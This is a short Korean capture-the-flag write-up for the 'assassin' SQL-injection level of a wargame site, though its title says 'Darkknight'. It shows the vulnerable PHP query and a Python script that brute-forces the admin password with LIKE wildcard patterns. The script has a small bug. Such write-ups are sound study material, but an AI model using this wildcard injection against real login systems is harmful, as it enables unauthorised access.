## Darkknight Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~");  
$query = "select id from prob_assassin where pw like '{$_GET[pw]}'";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";  
if($result['id'] == 'admin') solve("assassin");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

url = 'https://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}

for i in range(48, 127) :
    for j in range(48, 127) :
        params['pw'] = "%"+chr(i)+chr(j)+"%"
        res = requests.get(url, cookies=cookies, params=params)

        if "Clear" in res.text :
            print(chr(i) + chr(j))
            print("[♪] ASSASSIN Clear")
            boolean = False
            break
    if boolean==False :
        break
```
이번 문제는 like를 통해 admin의 pw를 찾아야 한다.  
pw가 무엇인지 모르기 때문에 %% 사이에 값을 넣어 admin을 찾아내면 된다.